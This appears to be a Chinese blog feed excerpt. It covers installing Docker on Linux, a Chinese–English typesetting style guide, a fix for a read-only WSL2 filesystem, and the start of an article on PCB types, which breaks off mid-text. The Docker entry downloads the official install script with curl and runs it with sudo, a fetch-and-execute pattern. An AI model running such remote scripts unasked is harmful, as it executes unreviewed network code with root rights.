之前，可以先用以下的命令卸载旧版本包，避免冲突：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>for<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>pkg<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>in<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>docker.io<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>docker-doc<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>docker-compose<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>podman-docker<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>containerd<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>runc<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>do<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>sudo<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>apt-get<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>remove<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>$pkg<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>done<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对于主流的 Linux 系统，可以使用官方脚本的方法下载安装 Docker Engine：（需要使用 root 用户权限）</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">&lt;<span class="hljs-string">span</span>&gt;&lt;/<span class="hljs-string">span</span>&gt;&lt;<span class="hljs-string">code</span>&gt;<span class="hljs-string">curl</span>&lt;<span class="hljs-string">span</span>&gt; &lt;/<span class="hljs-string">span</span>&gt;-<span class="hljs-string">fsSL</span>&lt;<span class="hljs-string">span</span>&gt; &lt;/<span class="hljs-string">span</span>&gt;<span class="hljs-string">https</span>://<span class="hljs-string">get</span>.<span class="hljs-string">docker</span>.<span class="hljs-string">com</span>&lt;<span class="hljs-string">span</span>&gt; &lt;/<span class="hljs-string">span</span>&gt;-<span class="hljs-string">o</span>&lt;<span class="hljs-string">span</span>&gt; &lt;/<span class="hljs-string">span</span>&gt;<span class="hljs-built_in">get-docker.sh</span><br><span class="hljs-string">sudo</span>&lt;<span class="hljs-string">span</span>&gt; &lt;/<span class="hljs-string">span</span>&gt;<span class="hljs-string">sh</span>&lt;<span class="hljs-string">span</span>&gt; &lt;/<span class="hljs-string">span</span>&gt;./<span class="hljs-built_in">get-docker.sh&lt;span&gt;</span> &lt;/<span class="hljs-string">span</span>&gt;<span class="hljs-built_in">--dry-run</span><br>&lt;/<span class="hljs-string">code</span>&gt;<br></code></pre></td></tr></table></figure><p>因为 Docker 运行在并依赖于 Linux 环境，所以它几乎没有效率损耗。但是，如果在其他系统上部署 Docker，就必须先安装一个虚拟 Linux 环境。</p><p><img src="https://media.wiki-power.com/img/20230708005714.png"></p><p>Windows 下 Docker 的安装方法，请参考官方文档 <a href="https://docs.docker.com/desktop/install/windows-install/"><strong>Install Docker Desktop on Windows</strong></a>。</p><p>MacOS 下的安装方法，请参考官方文档 <a href="https://docs.docker.com/desktop/install/mac-install/"><strong>Install Docker Desktop on Mac</strong></a>。</p><p>按照流程安装后，我们可以使用以下的命令，验证 Docker 是否安装成功：</p><p>在 Linux 下安装 Docker Engine 后，如果想要以非 root 用户使用，可以使用以下的命令配置权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>sudo<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>groupadd<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>docker<br>sudo<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>usermod<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>-aG<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>docker<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>$USER<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><br></code></pre></td></tr></table></figure><p>完成配置后，可能需要注销重新登录，以更新权限。</p><p>如果安装出现问题，请参考官方文档 <a href="https://docs.docker.com/engine/install/troubleshoot/"><strong>Troubleshoot Docker Engine installation</strong></a>。</p><h2 id="实例：Hello-World"><a href="#实例：Hello-World" class="headerlink" title="实例：Hello World"></a>实例：Hello World</h2><p>下面将用官方 hello-world 例子来演示 Docker。打开终端或命令提示符，并输入以下命令运行 hello-world 容器：</p><p>这将从 Docker 镜像仓库中下载 hello-world 镜像，创建并运行容器。当看见 hello world 的输出时，说明运行成功。</p><h2 id="一些常用的-Docker-CLI-命令"><a href="#一些常用的-Docker-CLI-命令" class="headerlink" title="一些常用的 Docker CLI 命令"></a>一些常用的 Docker CLI 命令</h2><p>Docker 提供了一组强大而丰富的命令，用于管理和操作容器、镜像、网络等资源。下面是一些常用的 Docker CLI 命令：</p><ul><li><code>docker run</code>：基于指定的镜像创建并运行一个新容器。例如，<code>docker run -d -p 8080:80 nginx</code> 会在后台运行一个 NGINX 容器，将主机的 8080 端口映射到容器的 80 端口。</li><li><code>docker ps</code>：列出正在运行的容器。默认情况下，它会显示正在运行的容器的 ID、镜像、命令等信息。使用 <code>docker ps -a</code> 命令可以显示所有的容器，包括已停止的容器。</li><li><code>docker stop</code>：停止一个或多个运行中的容器。可以指定容器的 ID 或名称。例如，<code>docker stop mycontainer</code> 会停止名为 <code>mycontainer</code> 的容器。</li><li><code>docker start</code>：启动一个或多个已停止的容器。可使用容器的 ID 或名称来指定容器。</li><li><code>docker stop</code>：停止一个或多个运行中的容器。</li><li><code>docker restart</code>：重启一个或多个容器。</li><li><code>docker rm</code>：删除一个或多个容器。如果要删除运行中的容器，可以使用 <code>docker rm -f</code> 命令。</li><li><code>docker images</code>：列出本地镜像。它会显示本地计算机上已经下载和创建的 Docker 镜像的列表，包括镜像 ID、大小和创建时间等信息。</li><li><code>docker rmi</code>：删除一个或多个镜像。可以使用镜像的 ID 或标签来指定镜像。例如，<code>docker rmi myimage:1.0</code> 会删除名为 <code>myimage</code> 且标签为 <code>1.0</code> 的镜像。</li><li><code>docker build</code>：基于 Dockerfile 构建一个自定义镜像。例如，<code>docker build -t myimage:1.0 .</code> 会根据当前目录下的 Dockerfile 构建一个名为 <code>myimage</code> 且标签为 <code>1.0</code> 的镜像。</li><li><code>docker exec</code>：在运行中的容器中执行命令。可以指定容器的 ID 或名称，以及要执行的命令。例如，<code>docker exec -it mycontainer bash</code> 会在名为 <code>mycontainer</code> 的容器中启动一个新的交互式终端。</li></ul><p>这些是一些常用的 Docker 命令，用于管理和操作容器和镜像。还有更多的命令可以探索，可以通过 <code>docker --help</code> 命令查看完整的命令列表和其它可用选项，也可以参考官方文档 <a href="https://docs.docker.com/engine/reference/commandline/cli/"><strong>Use the Docker command line</strong></a>。</p><p>如需了解更多 Docker 相关的知识，请移步后续的文章：</p><ul><li><a href="https://wiki-power.com/DockerCompose-%E9%95%9C%E5%83%8F%E7%BC%96%E6%8E%92%E5%B7%A5%E5%85%B7/"><strong>Docker Compose - 镜像编排工具</strong></a></li><li><a href="https://wiki-power.com/%E5%B0%86%E5%BA%94%E7%94%A8%E5%B0%81%E8%A3%85%E4%B8%BADocker%E5%AE%B9%E5%99%A8/"><strong>将应用封装为 Docker 容器</strong></a></li></ul><p>如果你想直接上手实践，也可参考以下系列的文章：</p><ul><li><a href="https://wiki-power.com/%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84HomeLab">搭建属于自己的 HomeLab</a></li><li><a href="https://wiki-power.com/Homelab-%E8%BD%BB%E9%87%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BFCasaOS">Homelab - 轻量服务器管理面板 CasaOS</a></li><li><a href="https://wiki-power.com/Homelab-%E5%8F%8D%E4%BB%A3%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86%E9%9D%A2%E6%9D%BFNginxProxyManager">Homelab - 反代证书管理面板 Nginx Proxy Manager</a></li><li><a href="https://wiki-power.com/Homelab-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7frp">Homelab - 内网穿透工具 frp</a></li><li><a href="https://wiki-power.com/Homelab-%E5%85%8D%E8%B4%B9%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88Cloudflared">Homelab - 免费的内网穿透替代方案 Cloudflared</a></li><li><a href="https://wiki-power.com/Homelab-%E5%9C%A8%E7%BA%BF%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8code-server">Homelab - 在线代码编辑器 code-server</a></li><li><a href="https://wiki-power.com/Homelab-%E7%BD%91%E7%AB%99%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7UptimeKuma">Homelab - 网站状态监控工具 Uptime Kuma</a></li><li><a href="https://wiki-power.com/Homelab-%E9%AB%98%E8%B4%A8%E9%87%8F%E5%9B%BE%E7%89%87%E5%8E%8B%E7%BC%A9%E5%B7%A5%E5%85%B7TinyPNG-docker">Homelab - 高质量图片压缩工具 TinyPNG-docker</a></li><li><a href="https://wiki-power.com/Homelab-%E6%9E%81%E7%AE%80%E4%B8%AA%E4%BA%BA%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%AB%99Flare">Homelab - 极简个人书签导航站 Flare</a></li><li><a href="https://wiki-power.com/Homelab-%E5%AE%B9%E5%99%A8%E5%BA%94%E7%94%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0Portainer">Homelab - 容器应用管理平台 Portainer</a></li><li><a href="https://wiki-power.com/Homelab-%E8%B7%A8%E8%AE%BE%E5%A4%87%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7Syncthing">Homelab - 跨设备同步工具 Syncthing</a></li><li><a href="https://wiki-power.com/Homelab-%E7%A2%8E%E7%89%87%E7%AC%94%E8%AE%B0%E5%B7%A5%E5%85%B7memos">Homelab - 碎片笔记工具 memos</a></li><li><a href="https://wiki-power.com/Homelab-%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84wiki%E7%B3%BB%E7%BB%9FWikijs">Homelab - 功能强大的 wiki 系统 Wiki.js</a></li><li><a href="https://wiki-power.com/Homelab-%E8%87%AA%E6%89%98%E7%AE%A1%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E5%99%A8Vaultwarden">Homelab - 自托管密码管理器 Vaultwarden</a></li><li><a href="https://wiki-power.com/Homelab-%E6%94%AF%E6%8C%81%E5%85%AC%E6%9C%89%E4%BA%91%E7%9A%84%E5%9B%BE%E5%BA%8A%E7%B3%BB%E7%BB%9FCloudreve">Homelab - 支持公有云的图床系统 Cloudreve</a></li><li><a href="https://wiki-power.com/Homelab-%E8%87%AA%E6%89%98%E7%AE%A1RSS%E8%81%9A%E5%90%88%E5%99%A8FreshRSS">Homelab - 自托管 RSS 聚合器 FreshRSS</a></li><li><a href="https://wiki-power.com/Homelab-%E6%94%AF%E6%8C%81%E5%A4%9A%E7%A7%8D%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%A0%A1%E5%9E%92%E6%9C%BANextTerminal">Homelab - 支持多种协议的堡垒机 Next Terminal</a></li><li><a href="https://wiki-power.com/Homelab-%E5%A4%9A%E5%8A%9F%E8%83%BDPDF%E5%B7%A5%E5%85%B7%E7%AE%B1Stirling-PDF">Homelab - 多功能 PDF 工具箱 Stirling-PDF</a></li><li><a href="https://wiki-power.com/Homelab-%E7%BD%91%E7%AB%99favicon%E6%8A%93%E5%8F%96%E5%B7%A5%E5%85%B7iconserver">Homelab - 网站 favicon 抓取工具 iconserver</a></li><li><a href="https://wiki-power.com/Homelab-%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0Docker%E5%AE%B9%E5%99%A8%E7%9A%84%E5%B7%A5%E5%85%B7Watchtower">Homelab - 自动更新 Docker 容器的工具 Watchtower</a></li><li><a href="https://wiki-power.com/Homelab-%E6%94%AF%E6%8C%81%E5%A4%9A%E5%AD%98%E5%82%A8%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%97%E8%A1%A8%E7%A8%8B%E5%BA%8FAlist">Homelab - 支持多存储的文件列表程序 Alist</a></li><li><a href="https://wiki-power.com/Homelab-%E5%8A%9F%E8%83%BD%E4%B8%B0%E5%AF%8C%E7%9A%84%E7%9C%8B%E6%9D%BF%E8%BD%AF%E4%BB%B6WeKan">Homelab - 功能丰富的看板软件 WeKan</a></li><li><a href="https://wiki-power.com/Homelab-%E6%92%AD%E5%AE%A2%E4%B8%8E%E6%9C%89%E5%A3%B0%E4%B9%A6%E6%9C%8D%E5%8A%A1%E5%99%A8Audiobookshelf">Homelab - 播客与有声书服务器 Audiobookshelf</a></li><li><a href="https://wiki-power.com/Homelab-%E4%BA%91%E7%AB%AF%E9%9F%B3%E4%B9%90%E6%9C%8D%E5%8A%A1%E5%99%A8Navidrome">Homelab - 云端音乐服务器 Navidrome</a></li><li><a href="https://wiki-power.com/Homelab-%E5%BD%B1%E8%A7%86%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8Jellyfin">Homelab - 影视媒体服务器 Jellyfin</a></li><li><a href="https://wiki-power.com/Homelab-%E7%94%B5%E5%AD%90%E4%B9%A6%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8calibre-web">Homelab - 电子书管理服务器 calibre-web</a></li><li><a href="https://wiki-power.com/Homelab-%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E6%9C%8D%E5%8A%A1%E5%99%A8HomeAssistant">Homelab - 智能家居服务器 Home Assistant</a></li><li><a href="https://wiki-power.com/Homelab-%E5%8D%A1%E7%89%87%E8%BE%85%E5%8A%A9%E8%AE%B0%E5%BF%86%E8%BD%AF%E4%BB%B6Anki">Homelab - 卡片辅助记忆软件 Anki</a></li></ul><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://yeasy.gitbook.io/docker_practice/">Docker - 从入门到实践</a></li><li><a href="https://www.runoob.com/docker/docker-tutorial.html">Docker 教程</a></li><li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html">Docker 入门教程</a></li><li><a href="https://wiki-power.com/unlist/CentOS%E5%AE%89%E8%A3%85Docker">CentOS 安装 Docker</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人文案排版规范</title>
    <link href="/2024/04/14/%E4%B8%AA%E4%BA%BA%E6%96%87%E6%A1%88%E6%8E%92%E7%89%88%E8%A7%84%E8%8C%83/"/>
    <url>/2024/04/14/%E4%B8%AA%E4%BA%BA%E6%96%87%E6%A1%88%E6%8E%92%E7%89%88%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>记录个人网站排版规划</p><span id="more"></span><h2 id="个人文案排版规范"><a href="#个人文案排版规范" class="headerlink" title="个人文案排版规范"></a>个人文案排版规范</h2><blockquote><p>有研究显示，打字的时候不喜欢在中文和英文之间加空格的人，感情路都走得很辛苦，有七成的比例会在 34 岁的时候跟自己不爱的人结婚，而其余三成的人最后只能把遗产留给自己的猫。毕竟爱情跟书写都需要适时地留白。 —— <a href="https://github.com/vinta/pangu.js"><strong>vinta&#x2F;paranoid-auto-spacing</strong></a></p></blockquote><p>为何要讲究排版规范？良好的文案排版，能降低理解难度，增强内容的可读性，极大提升用户的阅读体验。</p><h2 id="具体格式要求"><a href="#具体格式要求" class="headerlink" title="具体格式要求"></a>具体格式要求</h2><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><ul><li><strong>首行无需空格缩进，段与段之间空一行。</strong></li></ul><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>以下是需要添加空格的场景：</p><ul><li><p><strong>中文与英文、数字之间</strong>：</p><blockquote><p>错误：<code>这里是一个Wiki站点，建立于2015年一个炎热的夏天</code> 正确：<code>这里是一个 Wiki 站点，建立于 2015 年一个炎热的夏天</code></p></blockquote></li><li><p><strong>数字与单位之间</strong>：</p><blockquote><p>错误：其频率为 72MHz，占空比为 50 %<br>正确：其频率为 72 MHz，占空比为 50%。</p></blockquote></li><li><p><strong>普通与特殊字符（链接、加粗、斜体等）之间</strong>：</p><blockquote><p>这个 <strong>字体</strong> 使用了加粗样式<br>请 <a href="https://wiki.wildwolf.pw/"><strong>点击这里</strong></a> 进行订阅</p></blockquote></li><li><p><strong>英文半角标点之后</strong>：</p><blockquote><p>Hello, world</p></blockquote></li><li><p><strong>中文与破折号之间</strong>：</p><blockquote><p>Markdown- 一种高效的写作方式</p></blockquote></li></ul><p>不添加空格的场景：</p><ul><li><strong>数字与特殊单位</strong>： <code>%</code> <code>℃</code>。</li></ul><h3 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h3><ul><li><p><strong>中英文混排时，使用中文全角标点</strong></p></li><li><p><strong>中英文混排中，如果出现整句英文，则此句内使用英文半角标点</strong></p></li><li><p><strong>行内链接一般使用加粗，以提高阅读性</strong></p></li><li><p><strong>使用无序列表代替有序列表</strong></p></li><li><p><strong>使用准确的专有名词</strong>：</p><blockquote><p>错误：使用 github 登录<br>正确：使用 GitHub 登录</p></blockquote></li><li><p><strong>中文使用直角引号，代替普通引号</strong>：</p><blockquote><p>错误：华广机器人队，也称为 “野狼队” 正确：华广机器人队，也称为「野狼队」</p></blockquote></li><li><p><strong>特殊单位可直接使用</strong>：</p><blockquote><p><code>℃</code> <code>Ω</code> 等</p></blockquote></li><li><p><strong>不重复使用标点以强调</strong>：</p></li></ul><h2 id="写作风格"><a href="#写作风格" class="headerlink" title="写作风格"></a>写作风格</h2><ul><li>如无必要，勿增实体。</li><li>避免使用长句，尽量拆分为多个简单句。</li><li>论点要有论据支持，避免只说理不举例。</li></ul><h2 id="网站相关"><a href="#网站相关" class="headerlink" title="网站相关"></a>网站相关</h2><ul><li><strong>固定链接。</strong>因为文章可能会以链接的形式被他人引用，如果文章链接变更，可能会跳转只 404 页面，从而制造障碍。</li><li><strong>减少链接层级。</strong>对个人 Wiki 站点来说，推荐域名的样式为 <code>xxx.com/文章名</code>。</li></ul><h2 id="参考与致谢"><a href="#参考与致谢" class="headerlink" title="参考与致谢"></a>参考与致谢</h2><ul><li><a href="https://github.com/xitu/gold-miner/wiki/%E8%AF%91%E6%96%87%E6%8E%92%E7%89%88%E8%A7%84%E5%88%99%E6%8C%87%E5%8C%97">译文排版规则指北</a></li><li><a href="https://open.leancloud.cn/copywriting-style-guide/">文案风格指南</a></li><li><a href="https://github.com/vinta/pangu.js">為什麼你們就是不能加個空格呢？・vinta&#x2F;pangu.js</a></li><li><a href="https://github.com/ruanyf/document-style-guide">中文技术文档的写作规范・ruanyf&#x2F;document-style-guide</a></li><li><a href="https://open.leancloud.cn/improve-chinese/">余光中：怎样改进英式中文？- 论中文的常态与变态</a></li><li><a href="https://sspai.com/post/37815">少数派写作排版指南</a></li><li><a href="https://mp.weixin.qq.com/s/58f12ia2iFRTOXJitQIO2w">阿里设计师出品！B 端产品文案指南</a></li></ul><blockquote><p>原文地址：<a href="https://wiki-power.com/">https://wiki-power.com/</a><br>本篇文章受 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY-NC-SA 4.0</a> 协议保护，转载请注明出处。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记WSL2文件系统变成只读</title>
    <link href="/2024/04/13/%E8%AE%B0WSL2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8F%98%E6%88%90%E5%8F%AA%E8%AF%BB/"/>
    <url>/2024/04/13/%E8%AE%B0WSL2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8F%98%E6%88%90%E5%8F%AA%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>记WSL2文件系统变成只读</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天不知道为什么在打开WSL2的Ubuntu系统时，发现文件系统变成只读了，导致无法进行任何操作。并且，vscode也没法使用了。</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>解决方法很简单，只需要在命令行输入以下命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mount -o remount,rw /<br></code></pre></td></tr></table></figure><p>然后就可以正常使用了。</p><p>但是此时只是将文件系统重新挂载，将文件系统设置为可读写，但是没有解决vscode无法使用的问题。</p><h1 id="解决vscode无法使用的问题"><a href="#解决vscode无法使用的问题" class="headerlink" title="解决vscode无法使用的问题"></a>解决vscode无法使用的问题</h1><p>查找了一些资料后发现，解决方法还是很简单的：</p><p>首先在bash中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> -f ./.vscode-server ./.vscode-server-back<br></code></pre></td></tr></table></figure><p>在Powershell中输入以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wsl <span class="hljs-literal">--shutdown</span><br></code></pre></td></tr></table></figure><p>然后重新打开vscode，应该就可以正常使用了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">code ./<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>解决的方法比较简单，但是造成此次事故的原因好像是我强行关闭wsl所导致的？</p><p>下次在关闭wsl2之前应该要先将vscode关闭。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PCB原理</title>
    <link href="/2024/04/12/PCB%E5%8E%9F%E7%90%86/"/>
    <url>/2024/04/12/PCB%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>PCB相关知识点</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>PCB在现代电子技术中有着举足轻重的地位，大量的电子器件都使用了PCB。所以了解PCB原理对我们来说是非常重要的。</p><h1 id="PCB的历史与发展"><a href="#PCB的历史与发展" class="headerlink" title="PCB的历史与发展"></a>PCB的历史与发展</h1><p>印制电路技术虽然在第二次世界大战后才获得迅速发展,但是“印制电路”这一概念的来源,却要追溯到19世纪。<br>在19世纪,由于不存在复杂的电子装置和电气机械,因此没有大量生产印制电路板的问题,只是大量需要无源元器件,如电阻、线圈等。1899年,美国人提出采用金属箔冲压法,在基板上冲压金属箔制出电阻器,1927年提出采用电镀法制造电感、电容。<br>20世纪初,人们为了简化电子机器的制作,减少电子零件间的配线,降低制作成本等优点,于是开始钻研以印刷的方式取代配线的方法。</p><p>三十年间,不断有工程师提出在绝缘的基板上加以金属导体作配线。而最成功的是1925年,美国的Charles Ducas在绝缘的基板上印刷出线路图案,再以电镀的方式,成功建立导体作配线。直至1936年,奥地利人保罗·爱斯勒(Paul Eisler)在英国发表了箔膜技术,他在一个收音机装置内采用了印制电路板﹔而在日本,宫本喜之助以喷附配线法成功申请专利。</p><p>而两者中Paul Eisler 的方法与现今的印制电路板最为相似,这类做法称为减去法,是把不需要的金属除去﹔而 Charles Ducas,宫本喜之助的做法是只加上所需的配线,称为加成法。虽然如此,但因为当时的电子零件发热量大,两者的基板也难以配合使用,以致未有正式的实用作品,不过也使印制电路技术更进一步。</p><p>50年代中期,随着大面积的高黏合强度覆铜板的研制,为大量生产印制板提供了材料基础。1954年,美国通用电气公司采用了图形电镀-蚀刻法制板。</p><p>60年代,印制板得到广泛应用,并日益成为电子设备中必不可少的重要部件。在生产上除大量采用丝网漏印法和图形电镀一蚀刻法(即减成法)等工艺外,还应用了加成法工艺,使印制导线密度更高。目前高层数的多层印制板、挠性印制电路、金属芯印制电路、功能化印制电路都得到了长足的发展。</p><h1 id="PCB的分类以及结构"><a href="#PCB的分类以及结构" class="headerlink" title="PCB的分类以及结构"></a>PCB的分类以及结构</h1><h2 id="PCB的分类"><a href="#PCB的分类" class="headerlink" title="PCB的分类"></a>PCB的分类</h2><p>按照PCB板中铜的层数，可以将PCB分为：</p><ul><li>单层板: 最基本的PCB板，只有一层铜层。</li><li>双层板: 上下共两层铜层。</li><li>多层板：有着两层以上的PCB板，其实可以将多层板看作是由多个双层板组成的板子。</li></ul><p>按照PCB的材质，可以将PCB分为：</p><ul><li>刚性印刷电路板</li><li>柔性印刷电路板</li></ul><h3 id="单层板"><a href="#单层板" class="headerlink" title="单层板"></a>单层板</h3><p>上面说过，单层板只有一层铜层。这使得只有有铜层的一边才可以走线，所以这类PCB板一般只适合制作低级的电子产品。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130053419.png"></p><h3 id="双层板"><a href="#双层板" class="headerlink" title="双层板"></a>双层板</h3><p>双层板是指上层和下层都有一层铜层的PCB板。这类PCB板的上下两层都可以进行走线，使得其可以用来制作有一定复杂度的电子产品。</p><h3 id="多层板"><a href="#多层板" class="headerlink" title="多层板"></a>多层板</h3><p>多层板是由交替的导电图形层和绝缘材料层交替压制而成的。</p><p>多层板就可以看作是：多个二层板通过半固化片隔离而成。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130102259.png"></p><p><img 